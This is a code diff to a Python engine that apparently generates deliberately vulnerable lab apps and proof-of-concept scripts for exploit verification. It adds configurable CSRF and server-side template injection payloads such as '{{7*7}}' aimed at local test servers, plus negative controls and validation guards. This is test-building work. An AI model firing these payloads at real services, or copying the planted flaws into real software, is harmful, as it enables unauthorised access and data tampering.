-                    "    return jsonify({'success': True, 'balance': BALANCE['value'], 'flag': FLAG_TOKEN})",
+                    "    return jsonify({'success': True, 'balance': BALANCE['value'], 'flag': FLAG_TOKEN if amount > 0 else None})",
                     "",
                     "if __name__ == '__main__':",
                     f"    app.run(host='0.0.0.0', port={port})",
@@ -3055,22 +4258,24 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
+                "DEFAULT_PAYLOAD = '100'",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
                 "    jar = http.cookiejar.CookieJar()",
                 "    opener = build_opener(HTTPCookieProcessor(jar))",
                 "    login_request = Request(args.base_url.rstrip('/') + '/login', method='GET')",
                 "    with opener.open(login_request, timeout=5) as response:",
                 "        json.loads(response.read().decode('utf-8', errors='ignore'))",
-                "    url = args.base_url.rstrip('/') + '/transfer?amount=' + quote('100')",
+                "    url = args.base_url.rstrip('/') + '/transfer?amount=' + quote(args.payload)",
                 "    request = Request(url, method='POST')",
                 "    with opener.open(request, timeout=5) as response:",
                 "        payload = json.loads(response.read().decode('utf-8', errors='ignore'))",
                 "    if payload.get('success') is True and str(payload.get('flag')) == FLAG_TOKEN:",
-                "        print(SUCCESS_SIGNATURE)",
+                    "        print(SUCCESS_SIGNATURE)",
                 "        print(FLAG_TOKEN)",
                 "        return 0",
                 "    print('CSRF flow did not mutate state as expected')",
@@ -3080,6 +4285,27 @@ class SynthesisEngine:
                 "    raise SystemExit(main())",
                 "",
             ]
+        )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["CSRF flow did not mutate state as expected"],
+            negative_controls=[
+                {
+                    "name": "zero-amount",
+                    "expect_success": False,
+                    "payload": "0",
+                    "rationale": "zero-value request should not count as exploit success even if the session is present",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "larger-transfer",
+                    "expect_success": True,
+                    "payload": "250",
+                }
+            ],
+            metamorphic_rationale="authenticated state change should remain exploitable for alternative positive transfer amounts",
         )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
@@ -3091,6 +4317,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -3162,23 +4389,37 @@ class SynthesisEngine:
         poc_content = "\n".join(
             [
                 "import argparse",
+                "import re",
+                "import sys",
                 "from urllib.parse import quote",
                 "from urllib.request import Request, urlopen",
                 "",
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "PAYLOAD = '{{7*7}}'",
+                "DEFAULT_PAYLOAD = '{{7*7}}'",
+                "ARITH_RE = re.compile(r\"\\{\\{\\s*(\\d+)\\s*\\*\\s*(\\d+)\\s*\\}\\}\")",
+                "",
+                "def _expected_result(payload: str) -> str | None:",
+                "    match = ARITH_RE.fullmatch(payload.strip())",
+                "    if not match:",
+                "        return None",
+                "    return str(int(match.group(1)) * int(match.group(2)))",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/render?name=' + quote(PAYLOAD)",
+                "    expected = _expected_result(args.payload)",
+                "    if expected is None:",
+                "        print('Template payload was not arithmetic', file=sys.stderr)",
+                "        return 1",
+                "    url = args.base_url.rstrip('/') + '/render?name=' + quote(args.payload)",
                 "    request = Request(url, method='GET')",
                 "    with urlopen(request, timeout=5) as response:",
                 "        body = response.read().decode('utf-8', errors='ignore')",
-                "    if '49' in body:",
+                "    if expected in body:",
                 "        print(SUCCESS_SIGNATURE)",
                 "        print(FLAG_TOKEN)",
                 "        return 0",
@@ -3190,6 +4431,30 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=[
+                "Template payload did not evaluate server-side",
+                "Template payload was not arithmetic",
+            ],
+            negative_controls=[
+                {
+                    "name": "plain-name",
+                    "expect_success": False,
+                    "payload": "friend",
+                    "rationale": "plain string rendering should not count as template injection exploit success",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "alternate-arithmetic",
+                    "expect_success": True,
+                    "payload": "{{6*7}}",
+                }
+            ],
+            metamorphic_rationale="equivalent arithmetic SSTI payloads should preserve server-side evaluation",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -3200,6 +4465,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -3362,6 +4628,7 @@ class SynthesisEngine:
         poc_content: Optional[str],
         service_path: str = "app.py",
         verification_spec: Optional[Dict[str, Any]] = None,
+        extra_files: Optional[List[Dict[str, Any]]] = None,
     ) -> Dict[str, Any]:
         deps = [
             line.strip()
@@ -3414,6 +4681,10 @@ class SynthesisEngine:
                     "content": poc_content,
                 }
             )
+        if isinstance(extra_files, list):
+            for entry in extra_files:
+                if isinstance(entry, dict):
+                    files.append(deepcopy(entry))
         files.append(
             {
                 "path": "README.md",
@@ -3422,8 +4693,24 @@ class SynthesisEngine:
                 "content": readme_content,
             }
         )
+        payload_cases_present = False
+        if isinstance(verification_spec, dict):
+            negative_controls = verification_spec.get("negative_controls") if isinstance(verification_spec.get("negative_controls"), list) else []
+            metamorphic_cases = (
+                (verification_spec.get("metamorphic") or {}).get("cases")
+                if isinstance((verification_spec.get("metamorphic") or {}), dict)
+                else []
+            )
+            payload_cases_present = any(
+                isinstance(entry, dict) and str(entry.get("payload") or "").strip()
+                for entry in [*negative_controls, *metamorphic_cases]
+            )
         poc_block: Dict[str, Any] = {
-            "cmd": "python poc.py --base-url {{base_url}}",
+            "cmd": (
+                "python poc.py --base-url {{base_url}} --payload {{payload}}"
+                if payload_cases_present
+                else "python poc.py --base-url {{base_url}}"
+            ),
             "success_signature": success_signature,
         }
         if flag_token:
@@ -3994,6 +5281,7 @@ class SynthesisEngine:
                 errors.append(f"{path} exceeds byte limit ({byte_len})")
 
         errors.extend(self._guard_executor_constraints(manifest))
+        errors.extend(self._guard_design_brief_alignment(manifest))
 
         poc = manifest.get("poc", {})
         if not isinstance(poc, dict) or "cmd" not in poc or "success_signature" not in poc:
@@ -4243,6 +5531,49 @@ class SynthesisEngine:
 
         return errors
 
+    def _manifest_has_db_dependency_signal(self, manifest: Dict[str, Any]) -> bool:
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        if str(metadata.get("target_db") or "").strip():
+            return True
+        run = manifest.get("run") if isinstance(manifest.get("run"), dict) else {}
+        env = run.get("env") if isinstance(run.get("env"), dict) else {}
+        if any(str(key or "").strip().upper().startswith("DB_") for key in env.keys()):
+            return True
+        if any(str(key or "").strip().upper() == "DATABASE_URL" for key in env.keys()):
+            return True
+        if self._manifest_python_contains(manifest, "import sqlite3") or self._manifest_python_contains(manifest, "sqlite3.connect"):
+            return True
+        if self._manifest_contains_literal(manifest, "DATABASE_URL") or self._manifest_contains_literal(manifest, "DB_HOST"):
+            return True
+        return self._manifest_requires_external_db(manifest)
+
+    def _manifest_has_sidecar_dependency_signal(self, manifest: Dict[str, Any]) -> bool:
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        target_sidecars = metadata.get("target_sidecars") if isinstance(metadata.get("target_sidecars"), list) else []
+        if any(isinstance(item, str) and str(item).strip() for item in target_sidecars):
+            return True
+        run = manifest.get("run") if isinstance(manifest.get("run"), dict) else {}
+        env = run.get("env") if isinstance(run.get("env"), dict) else {}
+        host_markers = {"DB_HOST", "REDIS_HOST", "CACHE_HOST", "QUEUE_HOST", "MYSQL_HOST", "POSTGRES_HOST"}
+        if any(str(key or "").strip().upper() in host_markers for key in env.keys()):
+            return True
+        if self._manifest_contains_literal(manifest, "DB_HOST") or self._manifest_contains_literal(manifest, "db-internal"):
+            return True
+        return self._manifest_requires_external_db(manifest)
+
+    def _guard_design_brief_alignment(self, manifest: Dict[str, Any]) -> List[str]:
+        errors: List[str] = []
+        required_roles = set(self._design_brief_required_roles())
+        if "dependency_db" in required_roles and not self._manifest_has_db_dependency_signal(manifest):
+            errors.append(
+                "executor constraint violation: design_brief requires dependency_db but manifest lacks DB/runtime dependency signals"
+            )
+        if "dependency_sidecar" in required_roles and not self._manifest_has_sidecar_dependency_signal(manifest):
+            errors.append(
+                "executor constraint violation: design_brief requires dependency_sidecar but manifest lacks sidecar/host wiring signals"
+            )
+        return errors
+
     def _manifest_python_contains(self, manifest: Dict[str, Any], needle: str) -> bool:
         if not needle:
             return False
@@ -4424,6 +5755,7 @@ class SynthesisEngine:
         candidates_path = self.metadata_dir / "generator_candidates.json"
         payload = {
             "mode": self.mode,
+            "staged_synthesis": self._staged_synthesis_payload(),
             "candidates": [report.to_summary() for report in reports],
         }
         candidates_path.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
@@ -4448,6 +5780,7 @@ class SynthesisEngine:
             "sid": self.sid,
             "mode": self.mode,
             "limits": self.limits.to_dict(),
+            "staged_synthesis": self._staged_synthesis_payload(),
             # Absolute workspace root on disk for this synthesis run.
             # This allows downstream evaluators to locate the materialized
             # files without relying on hard-coded workspace/<sid>/app patterns.
@@ -4473,6 +5806,8 @@ class SynthesisEngine:
             "llm_provider_succeeded": selected.llm_provider_succeeded,
             "llm_failure_class": selected.llm_failure_class,
             "llm_failure_message": selected.llm_failure_message,
+            "failure_stage": selected.failure_stage or None,
+            "failure_stage_reason": selected.failure_stage_reason or None,
             "provenance": {
                 "generation_origin": generation_origin,
                 "fallback_used": selected.fallback_used,
@@ -4509,6 +5844,8 @@ class SynthesisEngine:
         family_override_applied = False
         llm_failure_class = ""
         llm_failure_message = ""
+        failure_stages: List[str] = []
+        failure_stage_reason = ""
         for report in reports:
             guard = report.guard_report or {}
             if report.violations:
@@ -4539,6 +5876,10 @@ class SynthesisEngine:
                 llm_failure_class = report.llm_failure_class.strip()
             if not llm_failure_message and isinstance(report.llm_failure_message, str) and report.llm_failure_message.strip():
                 llm_failure_message = report.llm_failure_message.strip()
+            if isinstance(report.failure_stage, str) and report.failure_stage.strip():
+                failure_stages.append(report.failure_stage.strip())
+            if not failure_stage_reason and isinstance(report.failure_stage_reason, str) and report.failure_stage_reason.strip():
+                failure_stage_reason = report.failure_stage_reason.strip()
         suggested = sorted(llm_high_conf or missing_static)
         if auto_patched:
             suggested = sorted(set(suggested) | auto_patched)
@@ -4548,6 +5889,7 @@ class SynthesisEngine:
             suggested = sorted(set(suggested) | noted_missing)
         timestamp = datetime.now(timezone.utc).isoformat()
         reason = "; ".join(sorted(set(guard_notes))) or "guard violations"
+        failure_stage = failure_stages[0] if failure_stages else ""
         unsupported_ops = self._extract_unsupported_ops(guard_notes)
         schema_errors = self._extract_schema_errors(guard_notes)
         schema_normalizations: List[str] = []
@@ -4578,6 +5920,8 @@ class SynthesisEngine:
             if isinstance(item, dict)
         )
         fix_hint = "Resolve generator guard violations and re-run synthesis."
+        if failure_stage:
+            fix_hint = f"Resolve staged synthesis `{failure_stage}` issues and re-run synthesis."
         lowered_reason = reason.lower()
         if guard_error_code == "guard_dsl_unsupported_op":
             fix_hint = (
@@ -4704,6 +6048,9 @@ class SynthesisEngine:
             "family_override_applied": family_override_applied,
             "llm_failure_class": llm_failure_class or None,
             "llm_failure_message": llm_failure_message or None,
+            "failure_stage": failure_stage or None,
+            "failure_stage_reason": failure_stage_reason or None,
+            "staged_synthesis": self._staged_synthesis_payload(),
         }
         for failure_path in failure_paths:
             with failure_path.open("a", encoding="utf-8") as handle:
